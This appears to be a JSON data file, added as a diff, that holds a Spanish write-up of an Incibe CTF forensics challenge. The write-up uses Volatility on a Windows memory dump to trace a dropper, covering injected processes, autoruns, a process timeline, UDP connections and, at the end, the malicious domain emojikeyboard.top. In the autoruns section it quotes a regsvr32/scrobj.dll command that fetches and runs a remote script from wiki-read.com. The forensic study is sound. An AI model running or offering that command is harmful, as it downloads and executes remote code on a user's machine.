@@ -1,0 +1,297 @@
+{
+    "title": "Reto DFIR 2 - Atenea Incibe",
+    "footer": {
+        "year": "2025",
+        "text": "Labs & CTFs "
+    },
+    "sections": [
+        {
+            "toolName": "Recursos",
+            "content": [
+                {
+                    "type": "link",
+                    "title": "Enlace del fichero usado",
+                    "content": "",
+                    "linkText": "Google Drive",
+                    "linkUrl": "https://drive.google.com/file/d/1OgjS9MtPklkL-jeiZcoj9SLAs8mFcl41/view?usp=sharing",
+                    "imageUrl": "",
+                    "imageCaption": "",
+                    "imageAlign": "center",
+                    "imageSize": "100"
+                }
+            ]
+        },
+        {
+            "toolName": "Contexto",
+            "content": [
+                {
+                    "type": "text",
+                    "title": "Información",
+                    "content": "Sospechamos que el volcado de memoria adjunto se corresponde con una máquina que ha<br>sido infectada de forma persistente por algún tipo de malware, posiblemente un dropper.<br>Nos gustaría identificar el dominio dañino utilizado por el mismo.",
+                    "linkText": "",
+                    "linkUrl": "",
+                    "imageUrl": "",
+                    "imageCaption": "",
+                    "imageAlign": "center",
+                    "imageSize": "100"
+                }
+            ]
+        },
+        {
+            "toolName": "Análisis de procesos",
+            "content": [
+                {
+                    "type": "image",
+                    "title": "",
+                    "content": "",
+                    "linkText": "",
+                    "linkUrl": "",
+                    "imageUrl": "img/20250115_191249_2025-01-15_20-12.png",
+                    "imageCaption": "Aquí podemos ver algunos procesos interesantes y algunas anomalías que iremos viendo más adelante",
+                    "imageAlign": "center",
+                    "imageSize": "100"
+                },
+                {
+                    "type": "text",
+                    "title": "Identificando posibles inyecciones en los comandos",
+                    "content": "En volatility disponemos de un módulo para intentar detectar inyecciónes o comportamientos anómalos en los procesos de windows.",
+                    "linkText": "",
+                    "linkUrl": "",
+                    "imageUrl": "",
+                    "imageCaption": "",
+                    "imageAlign": "center",
+                    "imageSize": "100"
+                },
+                {
+                    "type": "image",
+                    "title": "",
+                    "content": "",
+                    "linkText": "",
+                    "linkUrl": "",
+                    "imageUrl": "img/20250115_192639_Peek_2025-01-15_20-26.gif",
+                    "imageCaption": "Podemos ver que encuentra posibles anomalías en los dos prodesos de Internet Explorer y en csrss",
+                    "imageAlign": "center",
+                    "imageSize": "100"
+                },
+                {
+                    "type": "text",
+                    "title": "Análisis",
+                    "content": "En el proceso csrss.exe (PID 592):<br><br>-> Tiene una región de memoria con permisos PAGE_EXECUTE_READWRITE (que es sospechoso para csrss.exe)<br><br>-> Contiene código ensamblador que parece shellcode, con instrucciones como OUT y STD que son inusuales en código legítimo<br><br>En dos procesos de IEXPLORE.EXE (PIDs 1624 y 3728):<br><br>-> Ambos tienen regiones idénticas en la dirección 0x5fff0000<br>-> También con permisos PAGE_EXECUTE_READWRITE<br>-> Contienen la firma \"dtrR\" seguida de un patrón de bytes similar<br>-> El código ensamblador incluye un CALL FAR que podría ser usado para ejecución de código malicioso<br><br>",
+                    "linkText": "",
+                    "linkUrl": "",
+                    "imageUrl": "",
+                    "imageCaption": "",
+                    "imageAlign": "center",
+                    "imageSize": "100"
+                }
+            ]
+        },
+        {
+            "toolName": "Análisis de autoruns",
+            "content": [
+                {
+                    "type": "link",
+                    "title": "Plugin autorun",
+                    "content": "",
+                    "linkText": "Github",
+                    "linkUrl": "https://github.com/Telindus-CSIRT/volatility3-autoruns/blob/main/autorun.py",
+                    "imageUrl": "",
+                    "imageCaption": "",
+                    "imageAlign": "center",
+                    "imageSize": "100"
+                },
+                {
+                    "type": "text",
+                    "title": "",
+                    "content": "Una vez importado este plugin nos permite ver que ejecutables están configurados para ejecutarse al inicio del sistema lo que es normal en la forma de generar persistencia en un malware.",
+                    "linkText": "",
+                    "linkUrl": "",
+                    "imageUrl": "",
+                    "imageCaption": "",
+                    "imageAlign": "center",
+                    "imageSize": "100"
+                },
+                {
+                    "type": "image",
+                    "title": "",
+                    "content": "",
+                    "linkText": "",
+                    "linkUrl": "",
+                    "imageUrl": "img/20250115_193253_2025-01-15_20-32.png",
+                    "imageCaption": "",
+                    "imageAlign": "center",
+                    "imageSize": "100"
+                },
+                {
+                    "type": "text",
+                    "title": "Análisis",
+                    "content": "La entrada más sospechosa es <br><br>regsvr32 /u /s /i:http://wiki-read.com/info.txt scrobj.dll<br><br>Este comando en el autoruns es muy sospechoso porque:<br><br>-> Usa regsvr32 para desregistrar (/u) scrobj.dll<br>-> Intenta cargar un script desde una URL externa (http://wiki-read.com/info.txt)<br>-> Se ejecuta silenciosamente (/s)<br>-> Está configurado para ejecutarse automáticamente al inicio del sistema",
+                    "linkText": "",
+                    "linkUrl": "",
+                    "imageUrl": "",
+                    "imageCaption": "",
+                    "imageAlign": "center",
+                    "imageSize": "100"
+                },
+                {
+                    "type": "image",
+                    "title": "",
+                    "content": "",
+                    "linkText": "",
+                    "linkUrl": "",
+                    "imageUrl": "img/20250115_193539_2025-01-15_20-35.png",
+                    "imageCaption": "",
+                    "imageAlign": "center",
+                    "imageSize": "50"
+                },
+                {
+                    "type": "text",
+                    "title": "",
+                    "content": "regsvr32 /s /n /i:U shell32<br><br>Este comando aparece dos veces como \"_nltide_2\" en RunOnce para diferentes usuarios.<br><br>Hasta ahora el posible vector inicial de infección parece ser la descarga y ejecución del script malicioso desde wiki-read.com mediante regsvr32, que es una técnica conocida de \"Living off the Land\" para evadir defensas.",
+                    "linkText": "",
+                    "linkUrl": "",
+                    "imageUrl": "",
+                    "imageCaption": "",
+                    "imageAlign": "center",
+                    "imageSize": "100"
+                },
+                {
+                    "type": "text",
+                    "title": "Correlación",
+                    "content": "Esto encaja con el hallazgo anterior:<br><br>-> El script malicioso probablemente fue descargado a través de Internet Explorer<br><br>-> Inyectó código en csrss.exe (un proceso crítico del sistema)<br><br>-> Los dos procesos de IE con la misma firma indican que el malware se replicó",
+                    "linkText": "",
+                    "linkUrl": "",
+                    "imageUrl": "",
+                    "imageCaption": "",
+                    "imageAlign": "center",
+                    "imageSize": "100"
+                }
+            ]
+        },
+        {
+            "toolName": "Relación con los procesos",
+            "content": [
+                {
+                    "type": "image",
+                    "title": "",
+                    "content": "",
+                    "linkText": "",
+                    "linkUrl": "",
+                    "imageUrl": "img/20250115_194308_2025-01-15_20-43.png",
+                    "imageCaption": "",
+                    "imageAlign": "center",
+                    "imageSize": "100"
+                },
+                {
+                    "type": "text",
+                    "title": "Relación",
+                    "content": "Los procesos de Internet Explorer sospechosos (PIDs 1624 y 3728) son hijos de explorer.exe (PID 1868)<br><br>-> Esto es normal ya que IE se suele lanzar desde el explorador<br>-> Pero recordemos que ambos tienen la misma región de memoria maliciosa<br><br>Hay varios shells de cmd.exe abiertos (PIDs 3468, 300, 1080) también como hijos de explorer.exe<br><br>-> Esto podría indicar actividad de comando y control<br>-> Especialmente sospechoso tener múltiples shells abiertos<br><br>Hay dos instancias de explorer.exe (PIDs 1868 y 1608)<br><br>-> Una es hija de winlogon.exe (normal)<br>-> La otra (PID 1608) parece huérfana (su padre PID 1552 no existe)<br>-> Esta segunda instancia podría ser una persistencia del malware<br><br>El proceso regedit.exe (PID 2664) podría indicar modificaciones al registro<br><br>-> Esto coincide con las entradas de autoruns que encontramos antes",
+                    "linkText": "",
+                    "linkUrl": "",
+                    "imageUrl": "",
+                    "imageCaption": "",
+                    "imageAlign": "center",
+                    "imageSize": "100"
+                },
+                {
+                    "type": "text",
+                    "title": "Línea temporal",
+                    "content": "La línea temporal sugiere:<br><br>- 23:47: Se inicia el primer IE sospechoso (PID 1624)<br>- 23:49: Se modifican las entradas de autoruns (según el output anterior)<br>- 23:52: Se inicia el segundo IE sospechoso (PID 3728)",
+                    "linkText": "",
+                    "linkUrl": "",
+                    "imageUrl": "",
+                    "imageCaption": "",
+                    "imageAlign": "center",
+                    "imageSize": "100"
+                }
+            ]
+        },
+        {
+            "toolName": "Análisis de conexiónes",
+            "content": [
+                {
+                    "type": "image",
+                    "title": "",
+                    "content": "",
+                    "linkText": "",
+                    "linkUrl": "",
+                    "imageUrl": "img/20250115_195117_2025-01-15_20-50.png",
+                    "imageCaption": "",
+                    "imageAlign": "center",
+                    "imageSize": "100"
+                },
+                {
+                    "type": "text",
+                    "title": "Análisis",
+                    "content": "Los procesos de IE sospechosos tienen actividad de red:<br><br>-> PID 1624 usando UDP puerto 1031 en 127.0.0.1<br>-> PID 3728 usando UDP puerto 1035 en 127.0.0.1<br>-> Ambos procesos usan conexiones UDP locales, lo que es inusual para IE<br><br>Cronología interesante:<br><br>-> 23:47:13: Primera conexión del IE sospechoso (PID 1624)<br>-> 23:52:15: Segunda conexión del IE sospechoso (PID 3728)<br>-> Coincide con la timeline que vimos en el pstree<br><br><br>La comunicación UDP en localhost entre los procesos de IE es especialmente sospechosa y podría indicar:<br><br>- Comunicación entre componentes del malware<br>- Túnel C2 (Command & Control)<br>- Evasión de firewalls",
+                    "linkText": "",
+                    "linkUrl": "",
+                    "imageUrl": "",
+                    "imageCaption": "",
+                    "imageAlign": "center",
+                    "imageSize": "100"
+                }
+            ]
+        },
+        {
+            "toolName": "Análisis de URLs en memoria",
+            "content": [
+                {
+                    "type": "text",
+                    "title": "Datos del proceso 1624",
+                    "content": "Dado el timeline que hemos visto:<br><br>-> PID 1624 (primer IE) se inició a las 23:47:12<br>-> Las modificaciones del registro ocurrieron a las 23:49<br>-> PID 3728 (segundo IE) se inició después a las 23:52:15<br><br>El PID 1624 parece ser la infección inicial que desencadenó todo, así que es el mejor candidato para buscar la URL maliciosa.",
+                    "linkText": "",
+                    "linkUrl": "",
+                    "imageUrl": "img/20250115_195422_2025-01-15_20-54.png",
+                    "imageCaption": "Lo volcamos en un txt por si es mucho contenido ",
+                    "imageAlign": "center",
+                    "imageSize": "100"
+                },
+                {
+                    "type": "image",
+                    "title": "",
+                    "content": "",
+                    "linkText": "",
+                    "linkUrl": "",
+                    "imageUrl": "img/20250115_200501_2025-01-15_21-04.png",
+                    "imageCaption": "",
+                    "imageAlign": "center",
+                    "imageSize": "100"
+                },
+                {
+                    "type": "text",
+                    "title": "URLs sospechosas",
+                    "content": "En el volcado del comando vamos a encontrar numerosas entradas de datos correspondientes al patrón que hemos utilizado, en este caso \"https://\"<br><br>Tras una busqueda manual e ir verificando algunos de los dominios que vamos encontrando para ver su contenido, encontramos uno un tanto extraño.<br><br>",
+                    "linkText": "",
+                    "linkUrl": "",
+                    "imageUrl": "",
+                    "imageCaption": "",
+                    "imageAlign": "center",
+                    "imageSize": "100"
+                },
+                {
+                    "type": "image",
+                    "title": "",
+                    "content": "",
+                    "linkText": "",
+                    "linkUrl": "",
+                    "imageUrl": "img/20250115_221130_Peek_2025-01-15_23-11.gif",
+                    "imageCaption": "emojikeyboard.top",
+                    "imageAlign": "center",
+                    "imageSize": "100"
+                },
+                {
+                    "type": "image",
+                    "title": "",
+                    "content": "",
+                    "linkText": "",
+                    "linkUrl": "",
+                    "imageUrl": "img/20250115_221335_Peek_2025-01-15_23-13.gif",
+                    "imageCaption": "",
+                    "imageAlign": "center",
+                    "imageSize": "95"
+                }
+            ]
+        }
+    ]
+}
